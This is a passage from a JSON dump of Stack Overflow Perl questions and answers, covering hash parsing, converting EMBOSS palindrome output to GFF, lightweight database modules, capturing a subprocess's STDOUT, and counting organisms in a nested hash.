=&gt; {\n                    '2' =&gt; {\n                             'obj' =&gt; 'Obj2',\n                             'DateTime' =&gt; '2019-11-22 10:30:00',\n                             'text' =&gt; 'Line Missing',\n                             'priority' =&gt; 'High'\n                           },\n                    '' =&gt; {\n                            'text' =&gt; undef,\n                            'priority' =&gt; 'Low',\n                            'obj' =&gt; 'Obj3 is example obj',\n                            'DateTime' =&gt; '2019-11-20 11:01:01'\n                          },\n                    '4' =&gt; {\n                             'obj' =&gt; 'Obj9',\n                             'DateTime' =&gt; '2019-11-20 05:10:10',\n                             'text' =&gt; 'Line Missing',\n                             'priority' =&gt; 'High'\n                           }\n                  }\n        };\n\n</code></pre>\n\n<p>If you see the hash dumper, for <code>Pr2</code> one of the key is set to <code>undef</code> since the data(<code>ID</code>) in input file is kept in new line(which is actually a continuation of previous line<code>5;No Info Provided</code>)</p>\n\n<p>How can I take this <code>ID</code> as one of the key for <code>Pr2</code> while reading an input file.</p>\n"}, {"tags": ["perl", "palindrome", "emboss", "gff"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1574680239, "post_id": 59029949, "comment_id": 104304802, "body": "<i>&quot;But I could not use it...&quot;</i> That&#39;s not a very useful description of the problems you&#39;ve had. Could you please <a href=\"https://stackoverflow.com/posts/59029949/edit\">edit your question</a> and expand on that? What have you tried? What unexpected behaviour have you seen? Please show us your code."}], "owner": {"reputation": 55, "user_id": 7864686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98e0a6a08ad6755d06feef19e65992d5?s=128&d=identicon&r=PG", "display_name": "Leelouh", "link": "https://stackoverflow.com/users/7864686/leelouh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1574685233, "creation_date": 1574678546, "last_edit_date": 1574685233, "question_id": 59029949, "link": "https://stackoverflow.com/questions/59029949/how-to-convert-output-of-embosspalindrome-into-gff-bed-file-perl", "title": "How to convert output of Emboss:Palindrome into gff/bed file (perl)", "body": "<p>I am sorry ton ask this kind of stupid question but I could not find it by myself... I learned perl a while ago and I am a little lost.</p>\n\n<p>I want to convert this kind of output :</p>\n\n<pre><code>Palindromes of:  seq1 \nSequence length is: 24 \nStart at position: 1\nEnd at position: 24\nMinimum length of Palindromes is: 6 \nMaximum length of Palindromes is: 12 \nMaximum gap between elements is: 6 \nNumber of mismatches allowed in Palindrome: 0\n\n\n\nPalindromes:\n1        aaaaaaaaaaa       11\n         |||||||||||\n24       ttttttttttt       14\n\n\n\n\nPalindromes of:  seq2 \nSequence length is: 15 \nStart at position: 1\nEnd at position: 15\nMinimum length of Palindromes is: 6 \nMaximum length of Palindromes is: 12 \nMaximum gap between elements is: 6 \nNumber of mismatches allowed in Palindrome: 0\n\n\n\nPalindromes:\n1        aaaaaac        7\n         |||||||\n15       ttttttg        9\n</code></pre>\n\n<p>Into a gff or bed file :</p>\n\n<pre><code>seq1  1   24\nseq2  1   15\n</code></pre>\n\n<p>I found a perl module to do it : <a href=\"https://metacpan.org/pod/Bio::Tools::GFF\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/Bio::Tools::GFF</a></p>\n\n<p>This is my little script :</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings 'all';\nuse Bio::Tools::EMBOSS::Palindrome;\nuse Bio::Tools::GFF;\n\nmy $filename = \"truc.pal\";\n# a simple script to turn palindrome output into GFF3\n\nmy $parser = Bio::Tools::EMBOSS::Palindrome-&gt;new(-file =&gt; $filename);\nmy $out    = Bio::Tools::GFF-&gt;new(-gff_version =&gt; 3,\n                                 -file =&gt; \"&gt;$filename.gff\");\nwhile( my $seq = $parser-&gt;next_seq ) {\n   for my $feat ( $seq-&gt;get_SeqFeatures ) {\n      $out-&gt;write_feature($feat);\n   }\n}\n</code></pre>\n\n<p>This is the result :</p>\n\n<pre><code>##gff-version 3\nseq1       palindrome      similarity      14      24      .       -       1       allowed_mismatches=0;end=24;maximum gap=6;maximum_length=12;minimum_length=6;seqlength=24;start=1\nseq2       palindrome      similarity      9       15      .       -       1       allowed_mismatches=0;end=15;maximum gap=6;maximum_length=12;minimum_length=6;seqlength=15;start=1\n</code></pre>\n\n<p>The issue is : I want to have it the result the start and the end of the palindrome and the specific position in the last line.</p>\n\n<p>Exemple of what I want:</p>\n\n<pre><code>##gff-version 3\nseq1       palindrome      similarity      1      24      .       -       1       mismatches=0;gap_positions=11-14;gap_size=3\nseq2       palindrome      similarity      1      15      .       -       1       mismatches=0;gap_positions=7-9;gap_size=2\n</code></pre>\n\n<p>Thank you in advance.</p>\n"}, {"tags": ["database", "perl", "perl-module", "dbi"], "comments": [{"owner": {"reputation": 360, "user_id": 9696928, "user_type": "registered", "profile_image": "https://graph.facebook.com/565264017190206/picture?type=large", "display_name": "Mobrine Hayde", "link": "https://stackoverflow.com/users/9696928/mobrine-hayde"}, "edited": false, "score": 2, "creation_date": 1574634573, "post_id": 59023011, "comment_id": 104291167, "body": "If what you want is to store data in your hdd, you can use <code>DBM::Deep</code>, it is easy to manage"}, {"owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "reply_to_user": {"reputation": 360, "user_id": 9696928, "user_type": "registered", "profile_image": "https://graph.facebook.com/565264017190206/picture?type=large", "display_name": "Mobrine Hayde", "link": "https://stackoverflow.com/users/9696928/mobrine-hayde"}, "edited": false, "score": 0, "creation_date": 1574634844, "post_id": 59023011, "comment_id": 104291242, "body": "Does this module support query like SQL?"}, {"owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "edited": false, "score": 7, "creation_date": 1574634870, "post_id": 59023011, "comment_id": 104291248, "body": "<a href=\"https://metacpan.org/pod/DBD::SQLite\" rel=\"nofollow noreferrer\">DBD::SQLite</a> is a self-contained database management system fully compatible with the standard <a href=\"https://metacpan.org/pod/DBI\" rel=\"nofollow noreferrer\">DBI</a> module."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 4, "creation_date": 1574635005, "post_id": 59023011, "comment_id": 104291275, "body": "You might also like <a href=\"http://p3rl.org/DBD::CSV\" rel=\"nofollow noreferrer\">DBD::CSV</a> which provides a standard SQL interface to CSV files."}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1574660365, "post_id": 59023011, "comment_id": 104296224, "body": "You can use JSON, XML, YAMS formats to store data. Depending on chosen structure of the database you can implement  utility functions. Otherwise you can look at DBM   - <a href=\"https://metacpan.org/pod/DBD::DBM\" rel=\"nofollow noreferrer\">metacpan.org/pod/DBD::DBM</a>."}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1574654186, "post_id": 59024162, "comment_id": 104294818, "body": "&quot;<i>with no dependency to external binaries</i>&quot;  -- well, you need the actual sqlite  library itself (C). While that gets installed by the package, the Perl thing (DBD::SQLite) is just a driver. I second the suggestion, but it sure has a &quot;dependency.&quot;"}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 7, "creation_date": 1574661638, "post_id": 59024162, "comment_id": 104296564, "body": "@zdim it&#39;s not an external binary (it&#39;s linked in directly, not &quot;installed&quot; separately, and there&#39;s no server), and it&#39;s not a &quot;dependency&quot; in the sense of a prerequisite that you need to get beforehand or separately. So I think the answer gives a fair assessment."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 2, "creation_date": 1574671754, "post_id": 59024162, "comment_id": 104300183, "body": "@hobbs Dunno ... it&#39;s an independent general C library that the Perl bit interfaces. Even if the package bundles an sqlite version for convenience that is still a separate pop of C code, no-relation-to-Perl.  This is mostly semantics, and I support the answer (and upvoted it), but to my mind this is exactly a Perl driver for an external library."}], "tags": [], "owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "is_accepted": true, "score": 19, "last_activity_date": 1574646018, "last_edit_date": 1574646018, "creation_date": 1574645795, "answer_id": 59024162, "question_id": 59023011, "link": "https://stackoverflow.com/questions/59023011/is-there-any-implementation-of-database-by-perl/59024162#59024162", "title": "Is there any implementation of database by perl", "body": "<p>I would suggest using <a href=\"https://metacpan.org/pod/DBD::SQLite\" rel=\"noreferrer\">DBD::SQLite</a>. This is a self-contained database management system with no dependency to external binaries (unlike most others DBI drivers). It has nice options such as creating in-memory databases.</p>\n\n<p><a href=\"https://www.sqlite.org/index.html\" rel=\"noreferrer\">SQLite</a> is an open-source RDBMS that implements a significant subset of the SQL ANSI Standard.</p>\n\n<p><code>DBD::SQLite</code> is a legitimate DBI driver, so it conforms to the API of the great <a href=\"https://metacpan.org/pod/DBI\" rel=\"noreferrer\">DBI module</a>, which is the de-facto Perl standard interface for databases.</p>\n\n<p>From the documentation:</p>\n\n<blockquote>\n  <p>DBD::SQLite is a Perl DBI driver for SQLite, that includes the entire thing in the distribution. So in order to get a fast transaction capable RDBMS working for your perl project you simply have to install this module, and <strong>nothing</strong> else.</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "edited": false, "score": 1, "creation_date": 1574770876, "post_id": 59041887, "comment_id": 104341745, "body": "I would take a try"}], "tags": [], "owner": {"reputation": 460, "user_id": 1546132, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/293209332d895fb60448e72b44ad5810?s=128&d=identicon&r=PG", "display_name": "s0me0ne", "link": "https://stackoverflow.com/users/1546132/s0me0ne"}, "is_accepted": false, "score": 3, "last_activity_date": 1574727020, "creation_date": 1574727020, "answer_id": 59041887, "question_id": 59023011, "link": "https://stackoverflow.com/questions/59023011/is-there-any-implementation-of-database-by-perl/59041887#59041887", "title": "Is there any implementation of database by perl", "body": "<p>If you can live without SQL and relations, give <a href=\"https://metacpan.org/pod/distribution/DBM-Deep/lib/DBM/Deep.pod\" rel=\"nofollow noreferrer\">DBM::Deep</a> a try. Easiest of all, I wouldn't use it in production environment for sure, but it is ideal for rapid prototyping.</p>\n\n<blockquote>\n  <p>DESCRIPTION</p>\n  \n  <p>A unique flat-file database module, written in pure perl. True multi-level hash/array support (unlike MLDBM, which is faked), hybrid OO / tie() interface, cross-platform FTPable files, ACID transactions, and is quite fast. Can handle millions of keys and unlimited levels without significant slow-down. Written from the ground-up in pure perl -- this is NOT a wrapper around a C-based DBM. Out-of-the-box compatibility with Unix, Mac OS X and Windows.</p>\n</blockquote>\n"}], "owner": {"reputation": 171, "user_id": 2799433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b011e057102e676020e526b0b82f1949?s=128&d=identicon&r=PG&f=1", "display_name": "user2799433", "link": "https://stackoverflow.com/users/2799433/user2799433"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1149, "favorite_count": 0, "closed_date": 1599459645, "accepted_answer_id": 59024162, "answer_count": 2, "score": 9, "last_activity_date": 1582284831, "creation_date": 1574634077, "last_edit_date": 1582284831, "question_id": 59023011, "link": "https://stackoverflow.com/questions/59023011/is-there-any-implementation-of-database-by-perl", "closed_reason": "Not suitable for this site", "title": "Is there any implementation of database by perl", "body": "<p>Is there any perl modules implementing function of database and easy to use. I do not need modules used to connect to some database products. I need simple database writing by perl.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["list", "perl", "filehandle"], "answers": [{"tags": [], "owner": {"reputation": 360, "user_id": 9696928, "user_type": "registered", "profile_image": "https://graph.facebook.com/565264017190206/picture?type=large", "display_name": "Mobrine Hayde", "link": "https://stackoverflow.com/users/9696928/mobrine-hayde"}, "is_accepted": false, "score": 2, "last_activity_date": 1574630438, "last_edit_date": 1574630438, "creation_date": 1574629928, "answer_id": 59022447, "question_id": 59022340, "link": "https://stackoverflow.com/questions/59022340/perl-how-to-capture-stdout-of-list-form-system-call-as-a-filehandle/59022447#59022447", "title": "perl how to capture STDOUT of list form system call as a filehandle", "body": "<p>There is a more simple approach and it is to use <a href=\"https://metacpan.org/pod/IPC::Run\" rel=\"nofollow noreferrer\"><code>IPC::Run</code></a> using a simple code like this</p>\n\n<pre><code>use strict;\nuse warnings;\nuse IPC::Run qw(run);\nmy $in = \"\"; # some data you want to send to the sub-script, keep it empty if there is none\n# the data will be received from the STDIN filehandle in the called program\nmy $out = \"\"; # variable that will hold data writed to STDOUT\nmy $err;\nrun [\"perl\", \"junk2.pl\"], \\$in, \\$out, \\$err;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1574657346, "last_edit_date": 1574657346, "creation_date": 1574631067, "answer_id": 59022620, "question_id": 59022340, "link": "https://stackoverflow.com/questions/59022340/perl-how-to-capture-stdout-of-list-form-system-call-as-a-filehandle/59022620#59022620", "title": "perl how to capture STDOUT of list form system call as a filehandle", "body": "<p>You can continue to use <code>open</code> as follows:</p>\n\n<pre><code>open(my $child, \"-|\", $prog, @args)\n   or die(\"Can't launch \\\"$prog\\\": $!\\n\");\n\nmy @lines = &lt;$child&gt;;\n\nclose($child);\ndie(\"$prog killed by signal \".( $? &amp; 0x7F ).\"\\n\") if $? &amp; 0x7F;\ndie(\"$prog exited with error \".( $? &gt;&gt; 8 ).\"\\n\") if $ ?&gt;&gt; 8;\n</code></pre>\n\n<p>Warning: The above will treat the value of <code>$prog</code> as a shell command if <code>@args</code> is empty.</p>\n\n<p>General-purpose <a href=\"https://metacpan.org/pod/IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a> could also be used here.</p>\n\n<pre><code>use IPC::Run qw( run );\n\nrun [ $prog, @args ],\n   '&gt;', \\my $out;\n\ndie(\"$prog killed by signal \".( $? &amp; 0x7F ).\"\\n\") if $? &amp; 0x7F;\ndie(\"$prog exited with error \".( $? &gt;&gt; 8 ).\"\\n\") if $ ?&gt;&gt; 8;\n\nmy @lines = split(/^/m, $out);\n</code></pre>\n\n<p>There's also <a href=\"https://metacpan.org/pod/Capture::Tiny\" rel=\"nofollow noreferrer\">Capture::Tiny</a> which offers a minimalist interface for capturing both STDOUT and STDERR.</p>\n\n<hr>\n\n<p>Note that you can use <a href=\"http://metacpan.org/pod/String::ShellQuote\" rel=\"nofollow noreferrer\">String::ShellQuote</a>'s <code>shell_quote</code> to build commands for <code>sh</code>.</p>\n\n<pre><code>use String::ShellQuote qw( shell_quote );\n\nmy $cmd = shell_quote(\"junk2.pl\", @array);\n</code></pre>\n"}], "owner": {"reputation": 914, "user_id": 1461307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zhYSU.png?s=128&g=1", "display_name": "Jacob Wegelin", "link": "https://stackoverflow.com/users/1461307/jacob-wegelin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1574657346, "creation_date": 1574629051, "question_id": 59022340, "link": "https://stackoverflow.com/questions/59022340/perl-how-to-capture-stdout-of-list-form-system-call-as-a-filehandle", "title": "perl how to capture STDOUT of list form system call as a filehandle", "body": "<p>The following prototypes demonstrate how one can capture the <code>STDOUT</code> of a \"worker\" script, called by the \"boss\" script, as a <code>FILEHANDLE</code> and turn the contents of <code>FILEHANDLE</code> into an array that one can manipulate in the \"boss\" script. The boss script <code>junk.pl</code>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings;\nmy $boppin;\nmy $worker = \"junk2.pl\";\nopen(FILEHANDLE, \"$worker |\");\nmy @scriptSTDOUT=&lt;FILEHANDLE&gt;;\nclose FILEHANDLE;\nmy $count=0;\nforeach my $item ( @scriptSTDOUT ) {\n   $count++;\n   chomp $item;\n   print \"$count\\t$item\\n\";\n}\nif ( @scriptSTDOUT ) {\n   $boppin = pop @scriptSTDOUT; print \"boppin=$boppin\\n\";\n} else {\n   print STDERR \"nothing returned by $worker\\n\";\n}\nmy @array = ( '. . . \\x09 wow\\x21' , 5 );\nsystem $worker, @array;\n</code></pre>\n\n<p>and the \"worker\" <code>junk2.pl</code>: </p>\n\n<pre><code>#!/usr/bin/perl\nuse strict; use warnings; use 5.18.2;\nprint \"$0\";\n</code></pre>\n\n<p>This use of <code>open</code> and definition of a <code>FILEHANDLE</code> is okay if the <code>$worker</code> does not require, as argument, an array whose elements contain whitespace. But if such a complex argument is required, one must call the \"worker\" script in list form, as at the bottom of the \"boss\" script. For \"list form\", see <a href=\"https://stackoverflow.com/questions/50553031/calling-a-shell-command-with-multiple-arguments\">Calling a shell command with multiple arguments</a>.</p>\n\n<p>In that case, how does one capture the <code>STDOUT</code> as a <code>FILEHANDLE</code>? How can I modify the bottom line of the \"boss\" script to accomplish this?</p>\n"}, {"tags": ["string", "perl", "frequency"], "comments": [{"owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "edited": false, "score": 4, "creation_date": 1574629354, "post_id": 59022319, "comment_id": 104289871, "body": "Hash keys are by definition unique, what makes you expect otherwise?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574629509, "post_id": 59022319, "comment_id": 104289907, "body": "Do you mean to say that an &quot;organism&quot; is a word which may be in various keys? (Like: an organism is <code>fly</code> and keys are <code>some fly</code>, <code>other fly</code> ...)  You never showed us the actual keys, but only an array with <i>words</i> from all of them."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574629611, "post_id": 59022319, "comment_id": 104289933, "body": "Can you show specific examples of an &quot;<i>organism</i>&quot; and multiple keys in which it is &quot;<i>repeated</i>&quot;?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1574629746, "post_id": 59022319, "comment_id": 104289968, "body": "Your code starts with <code>my @string = keys %hash;</code>. But since <code>%hash</code> cannot have duplicate keys by design (duplicate definition will overwrite the previous one) <code>@string</code> cannot have duplicate entries. Your code started with the wrong assumption. If you manually put duplicate entries into <code>@string</code> then it works."}, {"owner": {"reputation": 509, "user_id": 6594286, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/10207751248792790/picture?type=large", "display_name": "Emilio M&#225;rmol S&#225;nchez", "link": "https://stackoverflow.com/users/6594286/emilio-m%c3%a1rmol-s%c3%a1nchez"}, "edited": false, "score": 0, "creation_date": 1574629909, "post_id": 59022319, "comment_id": 104290005, "body": "But when I defined them as values, I still got no good results..."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1574629965, "post_id": 59022319, "comment_id": 104290017, "body": "<i>&quot;But when I defined them as values, I still got no good results.&quot;</i> - please provide the relevant code since it is not fully clear what you mean by this. In general please provide sufficient code so that others can reproduce your problem and not just the fragments you deem important."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1574630899, "post_id": 59022319, "comment_id": 104290267, "body": "@EmilioM&#225;rmolS&#225;nchez: I assume that you&#39;ve did <code>Dumper(%hash)</code> instead of <code>Dumper(\\%hash)</code>. Still, it is not clear for me what you want to count. If it is the keys of the hash as asked in the title - there is exactly one of each by design. Substrings from the values of the inner hashes? Or what exactly? It might help to provide some realistic input and the expected output to better explain your problem."}], "answers": [{"comments": [{"owner": {"reputation": 509, "user_id": 6594286, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/10207751248792790/picture?type=large", "display_name": "Emilio M&#225;rmol S&#225;nchez", "link": "https://stackoverflow.com/users/6594286/emilio-m%c3%a1rmol-s%c3%a1nchez"}, "edited": false, "score": 0, "creation_date": 1574634409, "post_id": 59022723, "comment_id": 104291132, "body": "That provided the %count hash with the number of proteins for each organism yes, many thanks. But how to apply the %count values for each animal as a filtering procedure to only print the desired organisms with more than n (say 50) proteins? I have been wandering so long around this and could not reach a proper result... Something like, inside a foreach for running over the three dimensions of the hash, printing the keys (protID and number(length)) and the values (organism) if values of %count &gt; 50."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 509, "user_id": 6594286, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/10207751248792790/picture?type=large", "display_name": "Emilio M&#225;rmol S&#225;nchez", "link": "https://stackoverflow.com/users/6594286/emilio-m%c3%a1rmol-s%c3%a1nchez"}, "edited": false, "score": 0, "creation_date": 1574662124, "post_id": 59022723, "comment_id": 104296718, "body": "@EmilioM&#225;rmolS&#225;nchez: your original question asked for counting. Filtering based on the count is another question. But it could be done with doing similar construction of loops but this time not counting but instead deleting based on the previous count. Be aware though that you should not delete from a hash while iterating with <code>each</code> over it, i.e. either you collect the keys which need to be collected and delete after iteration or you iterate with <code>for (keys ...)</code> over the hash."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 2, "last_activity_date": 1574631810, "creation_date": 1574631810, "answer_id": 59022723, "question_id": 59022319, "link": "https://stackoverflow.com/questions/59022319/perl-count-frequency-of-keys-in-hash/59022723#59022723", "title": "Perl count frequency of keys in hash", "body": "<blockquote>\n  <p>More exactly, I wanto to know which organisms have more than 50 proteins Ids in my hash, and select them, getting rid of the other organisms with less number of proteins</p>\n</blockquote>\n\n<p>I'm not fully sure that I've completely understood your question but it looks like you have the following kind of hash:</p>\n\n<pre><code>my %hash = (\n    'protein_id#1' =&gt; {\n         'some-number' =&gt; 'organism-name'\n    },\n    'protein_id#2' =&gt; {\n         'some-number' =&gt; 'same-or-other-organism-name',\n    },\n    ...\n);\n</code></pre>\n\n<p>And you want to count how many <code>protein_id#X\u00b4 are for each different</code>organism-name`.</p>\n\n<p>In this case the following should work:</p>\n\n<pre><code> my %organism;\n # \"outer\" hash has protein_id as key\n while (my ($protein,$h2) = each %hash) {\n     # \"inner\" hash has organism-name as value\n     # same organism could maybe be multiple times inside the same inner hash\n     # but should only be counted once per protein_id\n     my %organism;\n     while (my ($some_number,$o) = each %$h2) {\n         $organism{$o}++\n     } \n     for (keys %organism) {\n          $count{$_}++;\n     }\n }\n</code></pre>\n"}], "owner": {"reputation": 509, "user_id": 6594286, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/10207751248792790/picture?type=large", "display_name": "Emilio M&#225;rmol S&#225;nchez", "link": "https://stackoverflow.com/users/6594286/emilio-m%c3%a1rmol-s%c3%a1nchez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 59022723, "answer_count": 1, "score": -1, "last_activity_date": 1574632571, "creation_date": 1574628926, "last_edit_date": 1574631371, "question_id": 59022319, "link": "https://stackoverflow.com/questions/59022319/perl-count-frequency-of-keys-in-hash", "title": "Perl count frequency of keys in hash", "body": "<p>I have extracted the first level of keys from multidimensional hash, which look like:</p>\n\n<pre><code>my @string = keys %hash;\n\nprint \"@string\\n\";\n\nBacteroides fragilis (strain YCH46).Agrocybe aegerita (Black poplar mushroom) (Agaricus \naegerita).Parabacteroides distasonis (strain ATCC 8503 / DSM 20701 / CIP 104284 / JCM 5825 / NCTC \n11152).Pelodictyon phaeoclathratiforme (strain DSM 5477 / BU-1).Clostridium kluyveri (strain NBRC \n12016).Torpedo marmorata (Marbled electric ray).Aethionema grandiflorum (Persian stone-cress).Conus \nconsors (Singed cone).Saguinus labiatus (Red-chested mustached tamarin).Staphylococcus haemolyticus \n(strain JCSC1435).Aeromonas salmonicida (strain A449).Acinetobacter genomosp. 13.Staphylococcus \naureus (strain USA300 / TCH1516).Loxosceles variegata (Recluse spider). and so on...\n</code></pre>\n\n<p>I am trying to count how many times a same organism is repeated (I know for sure that some of there are repeated many times).</p>\n\n<p>I have tried this code:</p>\n\n<pre><code>my %count;\n\nforeach my $os (@string)  \n{ \n$count{$os}++; \n} \n\n\nforeach my $os (sort keys %count)  \n{ \nprint $os, \" \", $count{$os}, \"\\n\";\n} \n</code></pre>\n\n<p>But I obtain the output like all of the organisms where just appearing once, although I know that is not the case.</p>\n\n<p>Strangely, when I tried to define a test string manually with some organisms repeated, the code worked.</p>\n\n<p>What is happening with my hash keys?</p>\n\n<p>I am able to access them separately within the list so they are well defined in principle...</p>\n\n<p>Any help?</p>\n\n<p>Edited:</p>\n\n<p>Dumper structure when organism are values:</p>\n\n<pre><code>'ACYP_SYNJB' =&gt; {\n                        '94' =&gt; 'Synechococcus sp. (strain JA-2-3B\\'a(2-13)) \n(Cyanobacteria bacterium Yellowstone B-Prime).'\n                      },\n      'ACTM_STRPU' =&gt; {\n                        '374' =&gt; 'Strongylocentrotus purpuratus (Purple sea \nurchin).'\n                      },\n      'A2ML1_HUMAN' =&gt; {\n                         '1454' =&gt; 'Homo sapiens (Human).'\n                       },\n      'ACTP_SALDC' =&gt; {\n                        '549' =&gt; 'Salmonella dublin (strain CT_02021853).'\n                      },\n      'ACBG2_XENLA' =&gt; {\n                         '739' =&gt; 'Xenopus laevis (African clawed frog).'\n                       },\n      'ACO1_AJECA' =&gt; {\n                        '476' =&gt; 'Ajellomyces capsulatus (Darling\\'s disease \nfungus) (Histoplasma capsulatum).'\n                      },\n      'ACTM_PISOC' =&gt; {\n                        '376' =&gt; 'Pisaster ochraceus (Ochre sea star) \n(Asterias ochracea).'\n                      },\n      '3MGH_RHOPB' =&gt; {\n                        '200' =&gt; 'Rhodopseudomonas palustris (strain \nBisB18).'\n                      }\n    };\n</code></pre>\n\n<p>And when keys:</p>\n\n<pre><code>$VAR3585 = 'Geobacter sulfurreducens (strain ATCC 51573 / DSM 12127 / 